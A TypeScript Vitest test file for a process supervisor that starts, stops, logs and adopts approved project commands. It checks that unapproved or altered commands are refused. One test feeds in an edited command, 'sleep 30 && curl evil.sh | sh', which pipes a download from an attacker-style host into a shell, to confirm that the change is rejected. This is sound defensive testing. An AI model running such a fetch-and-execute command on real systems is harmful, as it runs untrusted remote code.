import { describe, expect, it } from "vitest";
import { existsSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scratchEnv } from "../testing";
import { configOf } from "../projects";
import { DddError } from "../error";
import * as log from "./log";
import * as proc from "./proc";
import { stateOf, type Record } from "./record";
import { approve, put, records, runningRecord, shell, start, stop } from "./supervise";

/** A command that stays up until asked to stop. */
const SERVICE = "sleep 30";

async function waitUntil(cond: () => boolean | Promise<boolean>): Promise<boolean> {
  for (let i = 0; i < 300; i++) {
    if (await cond()) return true;
    await new Promise((r) => setTimeout(r, 10));
  }
  return false;
}

describe("supervise", () => {
  it("a config file is not permission to run", async () => {
    const { env } = scratchEnv("products-consent");
    const dir = tmpdir();
    const witness = join(dir, `ddd-consent-witness-${process.pid}-${process.hrtime.bigint()}`);
    const run = `touch ${witness}`;

    await expect(start(env, "proj/evil", run, dir)).rejects.toThrow(/not approved/);

    // Approving the same command and running it proves the witness *would* have
    // been written — otherwise this only asserts that `touch` is slow.
    approve(env, "proj/evil", run, dir);
    await start(env, "proj/evil", run, dir);
    expect(await waitUntil(() => existsSync(witness))).toBe(true);
    try {
      rmSync(witness);
    } catch {
      /* best effort */
    }
  });

  it("editing the command after approval stops it running", async () => {
    const { env } = scratchEnv("products-changed");
    const dir = tmpdir();
    approve(env, "proj/x", "sleep 30", dir);
    await expect(start(env, "proj/x", "sleep 30 && curl evil.sh | sh", dir)).rejects.toThrow(/changed/);
  });

  it("a started product runs, is adopted and stops", async () => {
    const { env } = scratchEnv("products-lifecycle");
    const dir = tmpdir();
    approve(env, "proj/svc", SERVICE, dir);

    const record = await start(env, "proj/svc", SERVICE, dir);
    expect(record.pid).toBeGreaterThan(0);

    // Adoption: read the pid back out of the file and re-verify it, exactly
    // what happens after a restart.
    const adopted = await runningRecord(env, "proj/svc");
    expect(adopted).not.toBeNull();
    expect(adopted!.pid).toBe(record.pid);
    expect(adopted!.startedAt).toBe(record.startedAt);

    expect(await stop(env, "proj/svc")).toEqual({ state: "stopped" });
    expect(await waitUntil(async () => (await proc.info(record.pid)) === null)).toBe(true);
    expect(await runningRecord(env, "proj/svc")).toBeNull();
  });

  it("a product that exits on its own stops reading as running", async () => {
    const { env } = scratchEnv("products-exit");
    const dir = tmpdir();
    approve(env, "proj/quick", "true", dir);

    const record = await start(env, "proj/quick", "true", dir);
    expect(await waitUntil(async () => (await runningRecord(env, "proj/quick")) === null)).toBe(true);

    // And it reads as exited, not unknown: it ended, and we know when.
    const stored = records(env).running.find((r) => r.key === "proj/quick")!;
    expect(stateOf(stored, await proc.info(record.pid)).state).toBe("exited");
  });

  it("output is captured to the log", async () => {
    const { env } = scratchEnv("products-log");
    const dir = tmpdir();
    approve(env, "proj/talk", "echo hello-from-the-product", dir);
    await start(env, "proj/talk", "echo hello-from-the-product", dir);

    const path = log.file(env.productsLogDir(), "proj/talk");
    expect(await waitUntil(() => log.tail(path, 5).includes("hello-from-the-product"))).toBe(true);
    await stop(env, "proj/talk");
  });

  it("starting twice is refused rather than leaking the first", async () => {
    const { env } = scratchEnv("products-double");
    const dir = tmpdir();
    approve(env, "proj/svc", SERVICE, dir);

    const first = await start(env, "proj/svc", SERVICE, dir);
    await expect(start(env, "proj/svc", SERVICE, dir)).rejects.toThrow(/already running/);

    await stop(env, "proj/svc");
    expect(await waitUntil(async () => (await proc.info(first.pid)) === null)).toBe(true);
  });

  it("a stale record is cleared rather than signalled", async () => {
    const { env } = scratchEnv("products-stale");
    const ghost: Record = {
      key: "proj/ghost",
      projectId: "proj",
      productId: "ghost",
      // pid 1 is init, and it did not start when this record claims.
      pid: 1,
      startedAt: "not when init started",
      command: "launchd",
      since: "2026-09-10T09:00:00Z",
    };
    put(env, { running: [ghost] });

    await expect(stop(env, "proj/ghost")).rejects.toThrow(/declined/);
    expect(records(env).running).toEqual([]);
  });

  it("the shell is a login shell", () => {
    expect(shell()).not.toBe("");
  });

  it("a shell that cannot launch rejects start rather than crashing", async () => {
    const { env } = scratchEnv("products-badshell");
    const dir = tmpdir();
    const run = "echo unreachable";
    approve(env, "proj/badshell", run, dir);

    // A `SHELL` that does not exist: `spawn` returns a child that emits an
    // async `error` (ENOENT) with no `pid`. Without a listener on that event,
    // the emission is an uncaught exception that would crash this very test
    // process — the point of this test is that it does not.
    const prevShell = process.env.SHELL;
    process.env.SHELL = join(dir, `ddd-no-such-shell-${process.pid}-${Date.now()}`);
    try {
      await expect(start(env, "proj/badshell", run, dir)).rejects.toBeInstanceOf(DddError);
    } finally {
      process.env.SHELL = prevShell;
    }
  });
});

describe("reading", () => {
  it("listing reads one file per project and runs no git", () => {
    const { env } = scratchEnv("products-cheap");
    const dir = join(env.dir, "proj");
    mkdirSync(join(dir, ".ddd"), { recursive: true });
    writeFileSync(join(dir, ".ddd", "config.json"), `{"products":[{"id":"serve","run":"npm run dev"}]}`);

    const config = configOf(dir);
    expect(config.products.length).toBe(1);
    expect(config.products[0]!.run).toBe("npm run dev");
    expect(existsSync(join(dir, ".git"))).toBe(false);
  });

  it("a project with no config declares nothing rather than failing", () => {
    const { env } = scratchEnv("products-noconfig");
    expect(configOf(join(env.dir, "not-there")).products).toEqual([]);
  });

  it("a malformed config declares nothing rather than failing", () => {
    const { env } = scratchEnv("products-broken");
    const dir = join(env.dir, "proj");
    mkdirSync(join(dir, ".ddd"), { recursive: true });
    writeFileSync(join(dir, ".ddd", "config.json"), "{ not json");
    expect(configOf(dir).products).toEqual([]);
  });
});
